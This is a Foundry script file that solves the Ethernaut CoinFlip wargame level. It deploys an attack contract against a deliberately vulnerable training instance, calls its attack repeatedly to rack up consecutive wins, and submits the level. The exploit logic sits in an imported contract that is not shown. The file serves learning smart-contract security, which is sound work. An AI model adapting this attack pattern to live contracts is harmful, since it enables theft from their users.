// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { CoinFlip } from "src/Level03.sol";
import { L03Attack } from "src/Level03Attack.sol";

contract Deploy is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    // Run with `forge script --broadcast script/Level03.sol:Deploy`
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        L03Attack attack = new L03Attack(CoinFlip(instanceAddress));
        console2.log(address(attack));
        vm.stopBroadcast();
    }
}

contract Attack is Script {
    // Run with `INSTANCE_ADDRESS=0x... ATTACK_ADDRESS=0x... forge script --broadcast script/Level03.sol:Attack` 10
    // times
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        CoinFlip instance = CoinFlip(vm.envAddress("INSTANCE_ADDRESS"));
        L03Attack attack = L03Attack(vm.envAddress("ATTACK_ADDRESS"));

        attack.attack();
        console2.log(instance.consecutiveWins());

        vm.stopBroadcast();
    }
}

contract Finalize is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    // Run with `INSTANCE_ADDRESS=0x... forge script --broadcast script/Level03.sol:Finalize`
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        ethernaut.submitLevelInstance(vm.envAddress("INSTANCE_ADDRESS"));
        vm.stopBroadcast();
    }
}
